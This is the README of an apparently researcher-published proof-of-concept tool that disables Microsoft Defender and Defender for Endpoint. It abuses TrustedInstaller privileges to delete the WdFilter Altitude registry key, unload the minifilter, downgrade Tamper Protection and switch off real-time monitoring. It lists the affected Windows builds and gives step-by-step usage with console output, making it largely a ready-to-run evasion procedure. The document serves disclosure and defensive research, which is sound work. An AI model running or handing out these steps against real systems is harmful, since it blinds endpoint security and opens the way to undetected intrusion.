# Disabling Tamper Protection and other Defender / MDE components 

It is possible to abuse SYSTEM / TrustedInstaller privileges to tamper or delete WdFilter settings (ALTITUDE regkey) and unload the kernel minidriver to disable Tamper protection and other Defender components. This also affects Microsoft's Defender for Endpoint (MDE), blinding MDE of telemetry and activity performed on a target.

This vulnerability, during testing was found to affect the following versions of Windows:
- Windows Server 2022 until BuildLabEx Version: 20348.1.amd64fre.fe_release.210507-1500 (April 2024 update)
- Windows Server 2019
- Windows 10 until BuildLabEx Version: 19041.1.amd64fre.vb_release.191206-1406 (April 2024 update)
- Windows 11 until BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Sep 2023 update). 

Blog explaining the bypass and POC: <https://www.alteredsecurity.com/post/disabling-tamper-protection-and-other-defender-mde-components>

## Usage

*NOTE: VC_redist.x64.exe (MSVC runtime) could be required to be installed on the target.*

POC Demo: <https://youtu.be/MI6aVDHRix8>

The POC works in 3 steps (Admin privileges required):

```
C:\> .\Disable-TamperProtection.exe
Sequential Usage: 1 --> 2 --> 3
1:      Unload WdFilter
2:      Disable Tamper Protection
3:      Disable AV/MDE
4:      Restore AV/MDE settings
```

An example, to use the POC is as follows: 

1) Unload WdFilter:

```
C:\> .\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key Value: 328010
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
[+] Created process ID: 3744 and assigned additional token privileges.
[+] Execute option 1 to validate!

# Upon 2nd execution if the above output repeats the target isn't vulnerable
C:\> .\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Enumerating WdFilter information:
        Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
[+] Restart the system or wait a few minutes for WdFilter to unload.
[+] Execute option 1 to validate!

# Restart to crash and unload WdFilter
C:\> .\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
```

2) Disable Tamper Protection:

```
C:\> .\Disable-TamperProtection.exe 2
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 00000000000000C4
[!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
[+] Created process ID: 7748 and assigned additional token privileges.
[+] Use option '3' to finally Disable AV/MDE.
```

3) Disable Defender / MDE components:

```
C:\> .\Disable-TamperProtection.exe 3
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 000000000000011C
[!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
[+] To disable other components of defender check source.
[+] Created process ID: 8040 and assigned additional token privileges.
```

4) Reinstate / restore the WdFilter minidriver, TamperProtection and Defender Settings (Real-Time). Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  

```
# Restart the computer after execution to restore settings successfully
C:\> .\Disable-TamperProtection.exe 4
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to Enable 'RealtimeMonitoring' regkey.
[+] Created process ID: 5852 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to Enable 'TamperProtection' regkey.
[+] Created process ID: 2744 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to restore WdFilter "Altitude" regkey.
[+] Created process ID: 7044 and assigned additional token privileges.
```

## References

- [Load order groups and altitudes for minifilter drivers by Microsoft](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers)
- [NSudo](https://github.com/M2Team/NSudo/releases)
- [superUser](https://github.com/mspaintmsi/superUser)
- [Research paper on Blinding Defender](https://arxiv.org/ftp/arxiv/papers/2210/2210.02821.pdf)
- [MDE Internals by FalconForce](https://www.first.org/resources/papers/conf2022/MDEInternals-FIRST.pdf)

## Credits 

Posted By: Munaf Shariff ([@m3rcer](https://twitter.com/al3x_m3rcer))

Security Researcher at Altered Security

